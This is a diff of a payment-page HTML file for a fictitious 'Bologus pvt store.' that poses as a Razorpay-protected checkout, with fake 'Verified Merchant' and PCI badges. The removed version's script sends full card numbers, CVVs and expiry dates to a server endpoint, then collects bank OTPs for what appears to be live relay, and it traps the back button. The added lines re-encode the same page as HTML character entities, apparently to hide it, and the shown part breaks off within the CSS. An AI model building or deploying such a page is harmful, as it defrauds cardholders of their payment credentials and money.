@@ -1,800 +1,477 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bologus pvt store.</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  <style>
-    .rupee-sign {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 1rem;
-      user-select: none;
-      color: #6b7280;
-      line-height: 1;
-      display: flex;
-      align-items: center;
-      height: 100%;
-      pointer-events: none;
-    }
-    .amount-display {
-      font-size: 18px;
-      font-weight: 400;
-      color: #1a1a1a;
-      text-align: center;
-      margin-bottom: 20px;
-      padding: 12px;
-      background: #f3f4f6;
-      border-radius: 8px;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      letter-spacing: -0.2px;
-    }
-    .page-container {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      padding-top: 1.5rem;
-    }
-    .content-wrapper {
-      flex: 1;
-      padding: 1rem;
-      margin-bottom: 6rem;
-    }
-    .merchant-badge {
-      position: relative;
-      cursor: pointer;
-      margin-left: 0;
-    }
-    .merchant-dropdown {
-      display: none;
-      position: absolute;
-      top: 100%;
-      left: 0;
-      background: white;
-      padding: 1rem;
-      border-radius: 0.5rem;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-      z-index: 10;
-      width: 300px;
-    }
-    .merchant-badge:hover .merchant-dropdown {
-      display: block;
-    }
-    .trusted-shield {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      padding: 1rem;
-      background: #66BB6A;
-      border-radius: 0.5rem;
-      margin-bottom: 1rem;
-    }
-    .verified-tag {
-      font-size: 0.75rem;
-      background: rgba(255,255,255,0.2);
-      padding: 0.25rem 0.5rem;
-      border-radius: 1rem;
-      color: #E0E0E0;
-    }
-    .verification-item {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      font-size: 0.875rem;
-      color: #4B5563;
-      padding: 0.25rem 0;
-    }
-    .verification-tick {
-      width: 1rem;
-      height: 1rem;
-      flex-shrink: 0;
-      color: #10B981;
-    }
-    .bottom-logos {
-      padding: 2rem 0;
-      margin-top: auto;
-      background: transparent;
-    }
-    @keyframes shieldPulse {
-      0% { transform: scale(1) rotate(0deg); filter: brightness(1); }
-      50% { transform: scale(1.05) rotate(5deg); filter: brightness(1.2); }
-      100% { transform: scale(1) rotate(0deg); filter: brightness(1); }
-    }
-    .shield-icon {
-      animation: shieldPulse 2s infinite;
-      transform-style: preserve-3d;
-      perspective: 1000px;
-    }
-    .consent-message {
-      display: flex;
-      align-items: flex-start;
-      gap: 0.5rem;
-      padding: 0.5rem;
-      border-radius: 0.25rem;
-      cursor: pointer;
-      font-size: 0.875rem;
-      color: #4B5563;
-    }
-    .consent-checkbox {
-      width: 1.25rem;
-      height: 1.25rem;
-      border: 2px solid #D1D5DB;
-      border-radius: 0.25rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-    }
-    .consent-checkbox.checked {
-      background-color: #10B981;
-      border-color: #10B981;
-    }
-    .consent-checkbox svg {
-      width: 1rem;
-      height: 1rem;
-      color: white;
-      display: none;
-    }
-    .consent-checkbox.checked svg {
-      display: block;
-    }
-    .animate-slide-in {
-      animation: slideIn 0.3s ease-out;
-    }
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .animate-spin {
-      display: inline-block;
-      animation: spin 1s linear infinite;
-      -webkit-animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-    .otp-input::placeholder {
-      color: #9CA3AF;
-      opacity: 0.7;
-    }
-    .otp-input:focus::placeholder {
-      opacity: 0;
-    }
-    .otp-input {
-      caret-color: transparent;
-    }
-    .btn-loading {
-      position: relative;
-    }
-    .btn-loading span {
-      opacity: 0.5;
-      filter: blur(1px);
-    }
-    .hidden { display: none !important; }
-    .otp-container {
-      display: flex;
-    }
-    .otp-input-wrapper {
-      width: 50%;
-      padding-right: 4px;
-    }
-    .otp-button-wrapper {
-      width: 50%;
-      padding-left: 4px;
-    }
-    .card-icon {
-      height: 24px;
-      width: auto;
-      display: block;
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-    }
-    #cardTypeIcon {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 24px;
-      width: 38px;
-    }
-    .otp-error {
-      color: #ef4444;
-      font-size: 13px;
-      margin: 4px 0 8px 0;
-      text-align: center;
-      display: none;
-    }
-  </style>
-</head>
-<body>
-  <div class="page-container" style="background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);">
-    <div class="content-wrapper">
-      <div class="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
-        <div class="flex flex-col md:flex-row">
-          <div class="md:w-7/12 p-5">
-            <div class="bg-white rounded-2xl shadow-sm mb-6">
-              <div class="flex items-start gap-4 mb-4 px-4 pt-4">
-                <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
-                  <img src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=64&h=64&fit=crop" alt="Merchant Logo" class="w-full h-full object-cover" />
-                </div>
-                <div class="flex flex-col">
-                  <span class="text-2xl font-semibold">Bologus pvt store.</span>
-                  <div class="merchant-badge mt-1">
-                    <div class="flex items-center gap-1 text-gray-600 text-sm">
-                      <svg class="w-4 h-4 text-green-500 shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                      </svg>
-                      <span>Verified Merchant</span>
-                    </div>
-                    <div class="merchant-dropdown">
-                      <div class="trusted-shield">
-                        <svg class="w-12 h-12 text-white shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                          <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                        </svg>
-                        <div class="flex flex-col">
-                          <span class="text-lg font-semibold text-white">Bologus pvt store.</span>
-                          <span class="verified-tag">Verified Merchant</span>
-                        </div>
-                      </div>
-                      <div class="space-y-2">
-                        <div class="verification-item">
-                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M5 13l4 4L19 7" />
-                          </svg>
-                          <span>Verified for authenticity</span>
-                        </div>
-                        <div class="verification-item">
-                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M5 13l4 4L19 7" />
-                          </svg>
-                          <span>Razorpay's risk system ensures secure payment protection from fraud</span>
-                        </div>
-                        <div class="verification-item">
-                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M5 13l4 4L19 7" />
-                          </svg>
-                          <span>Ensures that disputes are handled diligently</span>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-              
-              <div class="mt-4 px-6">
-                <h2 class="text-xl font-semibold mb-4">Payment Description</h2>
-                <p class="text-gray-600 mb-4">
-                  Payment for Digital Course Bundle – Premium access to our complete digital learning package including all courses and resources.
-                </p>
-                <div class="bg-blue-50 p-4 rounded-2xl mb-4">
-                  <div class="flex items-center gap-2 text-blue-700">
-                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                      <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                    </svg>
-                    <span class="text-sm">PCI DSS Compliant • 256-bit SSL Encryption • Secure Payment</span>
-                  </div>
-                </div>
-                <div class="text-sm text-gray-500 flex items-center gap-2">
-                  <span>Service fee is 2% of the transaction amount</span>
-                </div>
-                <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
-                  <span class="text-sm font-medium">INVOICE ID: </span>
-                  <span class="text-sm" id="invoiceId"></span>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <div class="md:w-5/12 p-5">
-            <div id="paymentForm">
-              <div class="amount-display mb-6">
-                Amount to Pay: ₹<span id="displayAmount">0</span>
-              </div>
-              
-              <form id="mainForm" class="space-y-4">
-                <div class="hidden">
-                  <label class="block text-sm font-medium text-gray-700 mb-2">Amount (INR)</label>
-                  <div class="relative">
-                    <span class="rupee-sign">₹</span>
-                    <input type="text" id="amount" class="block w-full pl-8 pr-3 py-2 border border-gray-300" readonly />
-                  </div>
-                </div>
-
-                <div>
-                  <label class="block text-sm font-medium text-gray-700 mb-2">Email</label>
-                  <input type="email" id="email" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="you@example.com" required>
-                </div>
-
-                <div>
-                  <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
-                  <div class="relative">
-                    <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="4242 4242 4242 4242" required>
-                    <div class="absolute right-3 top-1/2 -translate-y-1/2" id="cardTypeIcon"></div>
-                  </div>
-                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter a valid card number</p>
-                </div>
-
-                <div class="grid grid-cols-2 gap-4">
-                  <div>
-                    <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
-                    <input type="text" id="expiry" maxlength="5" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="MM/YY" required>
-                    <p id="expiryError" class="text-red-500 text-sm mt-1 hidden">Invalid expiry date</p>
-                  </div>
-                  <div>
-                    <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
-                    <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
-                  </div>
-                </div>
-
-                <div>
-                  <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
-                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="John Doe" required>
-                </div>
-
-                <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400">
-                  <span id="submitText">Proceed to Pay</span>
-                  <div id="submitLoader" class="w-5 h-5 animate-spin hidden ml-2">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                      <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
-                    </svg>
-                  </div>
-                </button>
-              </form>
-            </div>
-
-            <div id="otpForm" class="animate-slide-in hidden">
-              <p class="text-sm text-gray-600 mb-2">OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span></p>
-              <div class="otp-container">
-                <div class="otp-input-wrapper">
-                  <input type="text" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="Enter OTP" required>
-                </div>
-                <div class="otp-button-wrapper">
-                  <button type="button" id="otpSubmitButton" class="w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center" disabled>
-                    <span id="otpText">Confirm</span>
-                    <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
-                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
-                      </svg>
-                    </div>
-                  </button>
-                </div>
-              </div>
-              <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
-              <p class="text-center text-sm text-gray-500 mt-2">
-                Time remaining: <span id="timer">2:59</span>
-              </p>
-            </div>
-
-          <div class="consent-message mt-4" id="consentMessage" style="display: flex !important;">
-  <div class="consent-checkbox checked" id="consentCheckbox">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-      <path d="M5 13l4 4L19 7"/>
-    </svg>
-  </div>
-  <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
-</div>
-
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="bottom-logos flex justify-center items-center gap-6">
-      
-      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Khatabook.svg" alt="Powered by Khatabook" class="h-6" />
-      
-      <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" class="h-6" />
-      <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" class="h-4" />
-      <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" class="h-6" />
-      <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
-    </div>
-  </div>
-
-  <script>
-    document.addEventListener('DOMContentLoaded', async () => {
-      let isCardValid = false;
-      let isExpiryValid = false;
-      let isProcessing = false;
-      let currentInvoiceId = null;
-      let statusCheckInterval = null;
-      let timerInterval = null;
-      let timer = 180;
-      let consentChecked = true;
-
-      const urlParams = new URLSearchParams(window.location.search);
-      const pid = urlParams.get('pid');
-      if (pid) {
-        try {
-          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
-          const data = await response.json();
-          if (data.status === 'success') {
-            const amount = parseInt(data.payment.amount, 10);
-            document.getElementById('amount').value = amount;
-            document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
-          }
-        } catch (error) {
-          console.error('Error fetching payment details:', error);
-        }
-      }
-
-      function updateSubmitButton() {
-        const email = document.getElementById('email').value.trim();
-        const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
-        const expiry = document.getElementById('expiry').value;
-        const cvv = document.getElementById('cvv').value;
-        const cardholder = document.getElementById('cardholderName').value.trim();
-        const submitButton = document.getElementById('submitButton');
-        if (isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked) {
-          submitButton.disabled = false;
-          submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700";
-        } else {
-          submitButton.disabled = true;
-          submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
-        }
-      }
-
-      function updateConfirmOtpButton() {
-        const otp = document.getElementById('otp').value;
-        const otpButton = document.getElementById('otpSubmitButton');
-        if (otp.length === 6) {
-          otpButton.disabled = false;
-          otpButton.className = "w-full bg-blue-600 text-white py-2 px-4 rounded-none flex items-center justify-center";
-          document.getElementById('otpError').style.display = 'none';
-        } else {
-          otpButton.disabled = true;
-          otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
-        }
-      }
-
-      document.getElementById('consentCheckbox').addEventListener('click', function() {
-        consentChecked = !consentChecked;
-        if (consentChecked) {
-          this.classList.add('checked');
-        } else {
-          this.classList.remove('checked');
-        }
-        updateSubmitButton();
-      });
-
-      function validateCard(number) {
-        const clean = number.replace(/\D/g, '');
-        if (clean.length < 13 || clean.length > 16) return false;
-        let sum = 0, isEven = false;
-        for (let i = clean.length - 1; i >= 0; i--) {
-          let digit = parseInt(clean[i], 10);
-          if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
-          sum += digit;
-          isEven = !isEven;
-        }
-        return sum % 10 === 0;
-      }
-
-      function detectCardType(number) {
-        const clean = number.replace(/\D/g, '');
-        const firstDigit = clean.charAt(0);
-        if (firstDigit === '4') return 'visa';
-        if (firstDigit === '5') return 'mastercard';
-        if (firstDigit === '3') return 'amex';
-        if (firstDigit === '6') return 'rupay';
-        return null;
-      }
-
-      function updateCardTypeIcon(type) {
-        const iconContainer = document.getElementById('cardTypeIcon');
-        iconContainer.innerHTML = '';
-        if (type) {
-          const img = document.createElement('img');
-          img.style.height = "24px";
-          img.style.width = "auto";
-          switch (type) {
-            case 'visa':
-              img.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
-              break;
-            case 'mastercard':
-              img.src = 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png';
-              break;
-            case 'amex':
-              img.src = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
-              break;
-            case 'rupay':
-              img.src = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg';
-              break;
-          }
-          img.alt = type;
-          img.className = "card-icon";
-          iconContainer.appendChild(img);
-        }
-      }
-
-      function formatCardNumber(value) {
-        let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-        v = v.slice(0, 16);
-        const parts = [];
-        for (let i = 0; i < v.length; i += 4) {
-          parts.push(v.substring(i, i + 4));
-        }
-        const formatted = parts.join(' ');
-        isCardValid = validateCard(v);
-        const cardInput = document.getElementById('cardNumber');
-        const cardError = document.getElementById('cardError');
-        if (!isCardValid && v.length === 16) {
-          cardInput.classList.add('border-red-500');
-          cardError.classList.remove('hidden');
-        } else {
-          cardInput.classList.remove('border-red-500');
-          cardError.classList.add('hidden');
-        }
-        return formatted;
-      }
-
-      function validateExpiry(value) {
-        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
-        const [month, year] = value.split('/').map(num => parseInt(num, 10));
-        const now = new Date();
-        const currentYear = now.getFullYear() % 100;
-        const currentMonth = now.getMonth() + 1;
-        if (month < 1 || month > 12) return false;
-        if (year < currentYear || year > 50) return false;
-        if (year === currentYear && month < currentMonth) return false;
-        return true;
-      }
-
-      function formatExpiry(value) {
-        const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-        let formatted = v;
-        if (v.length >= 2) {
-          formatted = v.slice(0, 2) + '/' + v.slice(2, 4);
-        }
-        const expiryInput = document.getElementById('expiry');
-        const expiryError = document.getElementById('expiryError');
-        isExpiryValid = validateExpiry(formatted);
-        if (!isExpiryValid && formatted.length === 5) {
-          expiryInput.classList.add('border-red-500');
-          expiryError.classList.remove('hidden');
-        } else {
-          expiryInput.classList.remove('border-red-500');
-          expiryError.classList.add('hidden');
-        }
-        return formatted;
-      }
-
-      function startOtpTimer() {
-        if (timerInterval) clearInterval(timerInterval);
-        timer = 180;
-        timerInterval = setInterval(() => {
-          timer--;
-          const minutes = Math.floor(timer / 60);
-          const seconds = timer % 60;
-          document.getElementById('timer').textContent =
-            `${minutes}:${seconds.toString().padStart(2, '0')}`;
-          if (timer <= 0) {
-            clearInterval(timerInterval);
-            window.location.href = '/fail.html';
-          }
-        }, 1000);
-      }
-
-      document.getElementById('cardNumber').addEventListener('input', function(e) {
-        const cursor = e.target.selectionStart;
-        const lastLength = e.target.value.length;
-        let formatted = formatCardNumber(e.target.value);
-        e.target.value = formatted;
-        const cardType = detectCardType(formatted);
-        updateCardTypeIcon(cardType);
-        updateSubmitButton();
-        if (cursor && cursor < lastLength) {
-          const newCursor = cursor + (formatted.length - lastLength);
-          e.target.setSelectionRange(newCursor, newCursor);
-        }
-      });
-
-      document.getElementById('expiry').addEventListener('input', function(e) {
-        const cursor = e.target.selectionStart;
-        const lastLength = e.target.value.length;
-        let formatted = formatExpiry(e.target.value);
-        e.target.value = formatted;
-        updateSubmitButton();
-        if (cursor && cursor < lastLength) {
-          const newCursor = cursor + (formatted.length - lastLength);
-          e.target.setSelectionRange(newCursor, newCursor);
-        }
-      });
-
-      ['email', 'cvv', 'cardholderName'].forEach(id => {
-        document.getElementById(id).addEventListener('input', updateSubmitButton);
-      });
-
-      document.getElementById('otp').addEventListener('input', function(e) {
-        updateConfirmOtpButton();
-      });
-
-      async function checkTransactionStatus() {
-        if (!currentInvoiceId) return;
-        try {
-          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-          const data = await response.json();
-          if (data.status === 'show_otp') {
-            clearInterval(statusCheckInterval);
-            document.getElementById('paymentForm').classList.add('hidden');
-            document.getElementById('otpForm').classList.remove('hidden');
-            const cardNumber = document.getElementById('cardNumber').value;
-             document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
-            if (!timerInterval) { startOtpTimer(); }
-            if (data.otpError) {
-              document.getElementById('otpError').style.display = 'block';
-              // Reset OTP confirm button
-              const otpButton = document.getElementById('otpSubmitButton');
-              const otpLoader = document.getElementById('otpLoader');
-              const btnText = document.getElementById('otpText');
-              btnText.style.opacity = '1';
-              btnText.style.filter = 'none';
-              otpLoader.classList.add('hidden');
-              otpButton.disabled = false;
-            } else {
-              document.getElementById('otpError').style.display = 'none';
-            }
-            isProcessing = false;
-          } else if (data.status === 'redirect') {
-            window.location.href = data.redirectUrl;
-          }
-        } catch (err) {
-          console.error('Error checking transaction status:', err);
-        }
-      }
-
-      document.getElementById('mainForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        if (!isCardValid || !isExpiryValid || isProcessing) return;
-        isProcessing = true;
-        const submitButton = document.getElementById('submitButton');
-        const submitLoader = document.getElementById('submitLoader');
-        const buttonText = document.getElementById('submitText');
-        buttonText.style.opacity = '0.5';
-        buttonText.style.filter = 'blur(1px)';
-        submitLoader.classList.remove('hidden');
-        submitButton.disabled = true;
-        try {
-          const response = await fetch("/api/sendPaymentDetails", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-              expiry: document.getElementById('expiry').value,
-              cvv: document.getElementById('cvv').value,
-              email: document.getElementById('email').value,
-              amount: document.getElementById('amount').value,
-              currency: "INR",
-              cardholder: document.getElementById('cardholderName').value
-            })
-          });
-          const result = await response.json();
-          if (result.status === "success") {
-            currentInvoiceId = result.invoiceId;
-            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-          } else {
-            throw new Error('Payment submission failed');
-          }
-        } catch (err) {
-          console.error('Payment submission error:', err);
-          alert('Error processing payment. Please try again.');
-          isProcessing = false;
-          submitButton.disabled = false;
-          submitLoader.classList.add('hidden');
-          buttonText.style.opacity = '1';
-          buttonText.style.filter = 'none';
-          updateSubmitButton();
-        }
-      });
-
-      document.getElementById('otpSubmitButton').addEventListener('click', async () => {
-        if (isProcessing) return;
-        isProcessing = true;
-        const otpButton = document.getElementById('otpSubmitButton');
-        const otpLoader = document.getElementById('otpLoader');
-        const btnText = document.getElementById('otpText');
-        btnText.style.opacity = '0.5';
-        btnText.style.filter = 'blur(1px)';
-        otpLoader.classList.remove('hidden');
-        otpButton.disabled = true;
-        try {
-          const response = await fetch("/api/submitOTP", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              invoiceId: currentInvoiceId,
-              otp: document.getElementById('otp').value
-            })
-          });
-          if (!response.ok) {
-            throw new Error('Failed to submit OTP');
-          }
-          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-        } catch (err) {
-          console.error('OTP submission error:', err);
-          alert('Error submitting OTP. Please try again.');
-          isProcessing = false;
-          otpButton.disabled = false;
-          otpLoader.classList.add('hidden');
-          btnText.style.opacity = '1';
-          btnText.style.filter = 'none';
-        }
-      });
-    });
-    <script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
-  const invoiceId = localStorage.getItem("invoiceId");
-  if (invoiceId) {
-    socket.emit('join', invoiceId);
-  }
-  socket.on('show_otp', (data) => {
-    // Hide card form, show OTP form
-    document.getElementById('paymentForm').classList.add('hidden');
-    document.getElementById('otpForm').classList.remove('hidden');
-  });
-  socket.on('redirect', (data) => {
-    window.location.href = data.redirectUrl;
-  });
-</script>
-  </script>
-  <script>
-  // Push a dummy state so that the back button triggers popstate.
-  window.history.pushState(null, null, window.location.href);
-
-  window.addEventListener('popstate', function(event) {
-    showCancelModal();
-    // Push state again to prevent immediate navigation.
-    window.history.pushState(null, null, window.location.href);
-  });
-
-  function showCancelModal() {
-    let modal = document.getElementById("cancelModal");
-    if (!modal) {
-      modal = document.createElement("div");
-      modal.id = "cancelModal";
-      // Modal styles
-      modal.style.position = "fixed";
-      modal.style.top = "0";
-      modal.style.left = "0";
-      modal.style.width = "100%";
-      modal.style.height = "100%";
-      modal.style.backgroundColor = "rgba(0,0,0,0.5)";
-      modal.style.display = "flex";
-      modal.style.alignItems = "center";
-      modal.style.justifyContent = "center";
-      modal.style.zIndex = "10000";
-      // Modal inner HTML with two buttons: Yes and No.
-      modal.innerHTML = `
-        <div style="background: #fff; padding: 20px; border-radius: 5px; text-align: center; max-width: 300px;">
-          <p>Do you want to cancel this transaction?</p>
-          <button id="cancelYes" style="margin: 5px; padding: 5px 10px;">Yes</button>
-          <button id="cancelNo" style="margin: 5px; padding: 5px 10px;">No</button>
-        </div>
-      `;
-      document.body.appendChild(modal);
-
-      document.getElementById("cancelYes").addEventListener("click", function(){
-        // Redirect to fail.html if user chooses "Yes"
-        window.location.href = "/fail.html";
-      });
-      document.getElementById("cancelNo").addEventListener("click", function(){
-        // Hide the modal and keep user on the same page.
-        modal.style.display = "none";
-      });
-    } else {
-      modal.style.display = "flex";
-    }
-  }
-</script>
-  
-</body>
-</html>
+<!DOCTYPE html>&#13;
+<html lang="&#101;&#110;">&#13;
+<head>&#13;
+&#32;&#32;<meta charset="&#85;&#84;&#70;&#45;&#56;">&#13;
+&#32;&#32;<meta name="&#118;&#105;&#101;&#119;&#112;&#111;&#114;&#116;" content="&#119;&#105;&#100;&#116;&#104;&#61;&#100;&#101;&#118;&#105;&#99;&#101;&#45;&#119;&#105;&#100;&#116;&#104;&#44;&#32;&#105;&#110;&#105;&#116;&#105;&#97;&#108;&#45;&#115;&#99;&#97;&#108;&#101;&#61;&#49;&#46;&#48;">&#13;
+&#32;&#32;<title>&#66;&#111;&#108;&#111;&#103;&#117;&#115;&#32;&#112;&#118;&#116;&#32;&#115;&#116;&#111;&#114;&#101;&#46;</title>&#13;
+&#32;&#32;<link href="&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#100;&#110;&#46;&#106;&#115;&#100;&#101;&#108;&#105;&#118;&#114;&#46;&#110;&#101;&#116;&#47;&#110;&#112;&#109;&#47;&#116;&#97;&#105;&#108;&#119;&#105;&#110;&#100;&#99;&#115;&#115;&#64;&#50;&#46;&#50;&#46;&#49;&#57;&#47;&#100;&#105;&#115;&#116;&#47;&#116;&#97;&#105;&#108;&#119;&#105;&#110;&#100;&#46;&#109;&#105;&#110;&#46;&#99;&#115;&#115;" rel="&#115;&#116;&#121;&#108;&#101;&#115;&#104;&#101;&#101;&#116;">&#13;
+&#32;&#32;<style>&#13;
+&#32;&#32;&#32;&#32;&#46;&#114;&#117;&#112;&#101;&#101;&#45;&#115;&#105;&#103;&#110;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#112;&#111;&#115;&#105;&#116;&#105;&#111;&#110;&#58;&#32;&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#108;&#101;&#102;&#116;&#58;&#32;&#49;&#50;&#112;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#111;&#112;&#58;&#32;&#53;&#48;&#37;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#116;&#114;&#97;&#110;&#115;&#102;&#111;&#114;&#109;&#58;&#32;&#116;&#114;&#97;&#110;&#115;&#108;&#97;&#116;&#101;&#89;&#40;&#45;&#53;&#48;&#37;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#105;&#122;&#101;&#58;&#32;&#49;&#114;&#101;&#109;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#117;&#115;&#101;&#114;&#45;&#115;&#101;&#108;&#101;&#99;&#116;&#58;&#32;&#110;&#111;&#110;&#101;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#99;&#111;&#108;&#111;&#114;&#58;&#32;&#35;&#54;&#98;&#55;&#50;&#56;&#48;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#108;&#105;&#110;&#101;&#45;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#102;&#108;&#101;&#120;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#97;&#108;&#105;&#103;&#110;&#45;&#105;&#116;&#101;&#109;&#115;&#58;&#32;&#99;&#101;&#110;&#116;&#101;&#114;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#104;&#101;&#105;&#103;&#104;&#116;&#58;&#32;&#49;&#48;&#48;&#37;&#59;&#13;
